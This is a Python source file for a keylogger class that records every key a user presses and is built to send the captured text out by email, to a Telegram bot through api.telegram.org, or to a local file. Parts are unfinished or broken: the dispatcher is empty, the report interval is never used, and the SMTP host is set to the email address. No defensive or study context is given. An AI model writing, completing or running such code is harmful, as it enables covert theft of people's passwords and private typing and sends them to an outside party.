import keyboard
import requests
import smtplib

from re import fullmatch
from contracts import contract, new_contract

from config import SEND_REPORT_EVERY, TELEGRAM_BOT_TOKEN, \
                   EMAIL, EMAIL_PASSWORD, ADMIN_CHAT_ID


@new_contract
def validationCheckReportMethod(x):
    if x not in ("email", "file", "telegram"):
        raise ValueError("report_method can only be one of these three:"
                         "email, telegram, file. Unacceptable %s" % x)


@new_contract
def validationCheckEmail(x):  # TODO: replace re with py3-validate-email
    if not fullmatch(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', x):
        return ValueError("Invalid email")


class Keylogger:
    @contract
    def __init__(self, interval=3600, report_method="file"):
        """
        :param interval: time interval between reports (in seconds)
        :param report_method: where to send report

        :type interval: int,>0
        :type report_method: str,validationCheckReportMethod
        """
        self.interval = interval
        self.report_method = report_method
        self.log = ""

    @contract
    def report_to_email(self, email, password, text):
        """
        This method sends reports to the specified email.

        :param email: the name of the email where the logs will be sent
        :param password: password from email
        :param text: log message template

        :type email: str,validationCheckEmail
        :type password: str
        :type text: str        """
        smtp = smtplib.SMTP(host=email, port=587)
        smtp.starttls()
        smtp.login(email, password)
        smtp.sendmail(email, email, text)
        smtp.quit()

    @contract
    def report_to_telegram(self, bot_token, chat_id, text):
        # TODO: new parameter: text. update doc/contract
        """
        This method sends reports via telegram bot

        :param bot_token: your bot token (get it in @BotFather)
        :param chat_id: actually your ID (get it in @username_to_id_bot)
        :param text:

        :type bot_token: str
        :type chat_id: str
        :type text:
        """
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        request = requests.post(url, data={"chat_id": chat_id, "text": text})
        if request.status_code != 200:
            request.raise_for_status()

    def report_to_file(self):
        """
        This method ...
        """
        with open("text.txt", "w") as file:
            print(self.log, file=file)

    def callback(self, event):
        """
        This method is called when any key is pressed.
        It tracks the key pressed and writes it to log.
        """
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = " [ENTER]\n"
            else:
                name = f"[{name.upper()}]".replace(" ", "_")
        self.log += name

    def dispatcher(self):
        pass

    def start(self):
        """
        This method ...
        """
        keyboard.on_release(callback=self.callback)
        keyboard.wait()


def main():
    """
    """
    keylogger = Keylogger(SEND_REPORT_EVERY, "email")
    keylogger.start()


if __name__ == "__main__":
    main()
